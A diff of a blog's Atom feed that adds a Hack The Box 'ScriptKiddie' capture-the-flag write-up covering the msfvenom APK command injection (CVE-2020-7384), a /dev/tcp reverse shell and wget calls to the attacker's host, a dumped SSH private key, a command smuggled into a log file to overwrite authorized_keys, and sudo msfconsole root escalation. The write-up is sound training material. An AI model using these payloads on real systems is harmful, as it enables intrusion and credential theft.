@@ -1,5 +1,176 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-05-24T09:40:00+02:00</updated><entry><title>HTB: Delivery</title><link href="https://maggick.fr/2021/05/htb-delivery.html" rel="alternate"></link><published>2021-05-24T09:40:00+02:00</published><updated>2021-05-24T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-24:/2021/05/htb-delivery.html</id><summary type="html">&lt;p&gt;&lt;img alt="Delivery card" class="align-left" src="/media/2021.05/delivery_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-06-07T10:25:00+02:00</updated><entry><title>HTB: ScriptKiddie</title><link href="https://maggick.fr/2021/06/htb-scriptkiddie.html" rel="alternate"></link><published>2021-06-07T10:25:00+02:00</published><updated>2021-06-07T10:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-06-07:/2021/06/htb-scriptkiddie.html</id><summary type="html">&lt;p&gt;&lt;img alt="ScriptKiddie Card" class="align-left" src="/media/2021.06/sk_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/314"&gt;ScriptKiddie&lt;/a&gt; publish on
+February 6, 2021 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/4935"&gt;0xdf&lt;/a&gt;.
+This box is rated as easy box the user part implies to use CVE-2020-7384, the
+root part is just abusing a bash script and using msfconsole.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.06/sk_card.png" alt="ScriptKiddie Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/314"&gt;ScriptKiddie&lt;/a&gt; publish on
+February 6, 2021 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/4935"&gt;0xdf&lt;/a&gt;.
+This box is rated as easy box the user part implies to use CVE-2020-7384, the
+root part is just abusing a bash script and using msfconsole.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 22 (SSH) and 5000 with a HTTP
+service are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Feb  7 08:50:44 2021 as: nmap -p- -sSV -oN nmap 10.129.94.194&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.94.194&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.011s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sun Feb  7 08:51:09 2021 -- 1 IP address (1 host up) scanned in 24.16 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The webpage seems to be a "hacker" personal page with a few wrapper around
+classical tools as &lt;code&gt;nmap&lt;/code&gt;, &lt;code&gt;msfvenom&lt;/code&gt; and &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Homepage" src="/media/2021.06/sc_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;The "template file" option with &lt;code&gt;msfvenom&lt;/code&gt; is strange. After a few Google research we found
+about CVE-2020-7384 which is "msfvenom APK template command injection" and has
+&lt;a href="https://www.exploit-db.com/exploits/49491"&gt;a public exploit available&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We change the payload to perform a &lt;code&gt;wget&lt;/code&gt; on our python server&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Change me&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wget 10.10.14.64:8000&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We got a hit on our local python HTTP which confirm our RCE.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp$ python3 -m http.server&lt;/span&gt;
+&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.94.194 - - [07/Feb/2021 09:27:09] &amp;quot;GET / HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We change the payload again for a reverse shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.64/4433 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run netcat to catch it and got the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp$ nc -l -p 4433&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
+&lt;span class="code-line"&gt;$ uid=1000(kid) gid=1000(kid) groups=1000(kid)&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cd&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;51573bc36ae7c15d3bb11c3b043a5dea&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;h2 id="persistance"&gt;Persistance&lt;/h2&gt;
+&lt;p&gt;We look at our user home folder and get the SSH private key&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls -al&lt;/span&gt;
+&lt;span class="code-line"&gt;total 60&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 11 kid  kid  4096 Feb  3 11:49 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  4 root root 4096 Feb  3 07:40 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;lrwxrwxrwx  1 root kid     9 Jan  5 20:31 .bash_history -&amp;gt; /dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .bundle&lt;/span&gt;
+&lt;span class="code-line"&gt;drwx------  2 kid  kid  4096 Feb  3 07:40 .cache&lt;/span&gt;
+&lt;span class="code-line"&gt;drwx------  4 kid  kid  4096 Feb  3 11:49 .gnupg&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .local&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  9 kid  kid  4096 Feb  3 07:40 .msf4&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;drwx------  2 kid  kid  4096 Feb  3 07:40 .ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid     0 Jan  5 11:10 .sudo_as_admin_successful&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  5 kid  kid  4096 Feb  7 14:25 html&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxrwx  2 kid  kid  4096 Feb  3 07:40 logs&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  3 kid  kid  4096 Feb  3 11:48 snap&lt;/span&gt;
+&lt;span class="code-line"&gt;-r--------  1 kid  kid    33 Feb  7 13:48 user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;$ ls .ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;authorized_keys&lt;/span&gt;
+&lt;span class="code-line"&gt;id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;id_rsa.pub&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat .ssh/authorized_keys&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt/&lt;/span&gt;
+&lt;span class="code-line"&gt;MXWipZH4vmE0lLycTlwk0eFcEQilnSCwpQoLA9QEiFAMvopNThWyjGkst6HNPdDvSDlJEfTtW4PaOFA&lt;/span&gt;
+&lt;span class="code-line"&gt;seUICcwuidMXc4xepu1t0hrfv5Wn7SiwQwIDwE0DvRRSpLIr9I0wfjjEPnvc4y7uuMvsf0hegZLMnChg&lt;/span&gt;
+&lt;span class="code-line"&gt;stWWCw99DS5q0YdXxkIC7eKlI90nHyUHL3ULwXDBk6NWhPmJ90yDaFC4iD0yVP3xmjKjl0iotkqbhKhR&lt;/span&gt;
+&lt;span class="code-line"&gt;AD8bUINZ7anXTw4Hb0iF5tMAttB8JbLts5zvgQtYrciKE4Qnl4F+MO5yg3G03s9V69K4R+TXmI4TZKUH&lt;/span&gt;
+&lt;span class="code-line"&gt;fEpNnReQ+73uOqgjH5VeZr0TmSLEszfFfXRcv7t4jxOboYnS+lgR1V2iGHzSle+nAlVLHqlwP5RTtwaO&lt;/span&gt;
+&lt;span class="code-line"&gt;wE0nbykigyz/h4KNCn0rU69fYWSrkcFPYOSm92QKmaMJuXqnycjuqLmHMD2XKSuhlpgD/VmQL34C7pju&lt;/span&gt;
+&lt;span class="code-line"&gt;4h+/78qK50+itG0FCiSy6IRd5DIfTkU= kid@scriptkiddie&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat .ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
+&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEArfzF1oqWR+L5hNJS8nE5cJNHhXBEIpZ0gsKUKCwPUBIhQDL6KTU4&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;sOeM4jMTD4DJbb/8Jsh6yzW45V3bgPp1Hm4nI3AZ8SjSI4VqtO9CcDKtPnvh3/jm5VEx9W&lt;/span&gt;
+&lt;span class="code-line"&gt;bK3NNrAo9t2tlfAAAAEGtpZEBzY3JpcHRraWRkaWUBAg==&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="scanlosers"&gt;scanlosers&lt;/h2&gt;
+&lt;p&gt;We can now  directly connect using SSH. Looking at the accessible files we found
+that the &lt;code&gt;pwn&lt;/code&gt; user has a script &lt;code&gt;scanlosers.sh&lt;/code&gt; readable by our user. This
+script read a log file containing "hacking" attempts and run a &lt;code&gt;nmap --top10&lt;/code&gt; on
+it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh kid@10.129.94.194 -i sc_id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;kid@scriptkiddie:~$ cat ../pwn/scanlosers.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;log=/home/kid/logs/hackers&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /home/pwn/&lt;/span&gt;
+&lt;span class="code-line"&gt;cat $log | cut -d&amp;#39; &amp;#39; -f3- | sort -u | while read ip; do&lt;/span&gt;
+&lt;span class="code-line"&gt;    sh -c &amp;quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null&amp;quot; &amp;amp;&lt;/span&gt;
+&lt;span class="code-line"&gt;done&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;if [[ $(wc -l &amp;lt; $log) -gt 0 ]]; then echo -n &amp;gt; $log; fi&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We download /home/kid/.ssh/authorized_keys localy and rename it to test a few
+payload locally. The &lt;code&gt;cut -d' ' -f3-&lt;/code&gt; means that the 3 first "words"
+(characters separated by a space) will be dropped.&lt;/p&gt;
+&lt;p&gt;The idea is to execute a payload in order to add our SSH key to the "pwn"
+user. As always we start by a simple &lt;code&gt;wget&lt;/code&gt; to ensure the RCE. After a few
+attempt we found the following payload that we add to the &lt;code&gt;hackers&lt;/code&gt; file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;echo &amp;#39;q w e 127.0.0.1 127.0.0.1 ; wget 10.10.14.64:8000/a -O /home/pwn/.ssh/authorized_keys  ; #&amp;#39; &amp;gt; ../kid/logs/hackers&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As the "kid" private key is now also authorized for the "pown" user, we connect
+using directly SSH.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh pwn@10.129.94.194 -i sc_id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;pwn@scriptkiddie:~$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="msfconsole"&gt;msfconsole&lt;/h2&gt;
+&lt;p&gt;Our "pown" user can run &lt;code&gt;msfconsole&lt;/code&gt; as "root" without any password, which
+quickly give us a shell using the &lt;code&gt;bash&lt;/code&gt; msf command allowing us to get the root
+flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pwn@scriptkiddie:~$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for pwn on scriptkiddie:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User pwn may run the following commands on scriptkiddie:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole&lt;/span&gt;
+&lt;span class="code-line"&gt;pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;msf6 &amp;gt; bash&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] exec: bash&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;root@scriptkiddie:/home/pwn# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;root@scriptkiddie:/home/pwn# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;b4ccca123e8efc9cc65296e42ed4cabf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;An easy box exploiting a few mechanisms. The msfvenom exploit was fun to use.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="msfvenom"></category><category term="nmap"></category><category term="msfconsole"></category></entry><entry><title>HTB: Delivery</title><link href="https://maggick.fr/2021/05/htb-delivery.html" rel="alternate"></link><published>2021-05-24T09:40:00+02:00</published><updated>2021-05-24T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-24:/2021/05/htb-delivery.html</id><summary type="html">&lt;p&gt;&lt;img alt="Delivery card" class="align-left" src="/media/2021.05/delivery_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/308"&gt;Delivery&lt;/a&gt; created by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/3769"&gt;ippsec&lt;/a&gt; and publish on
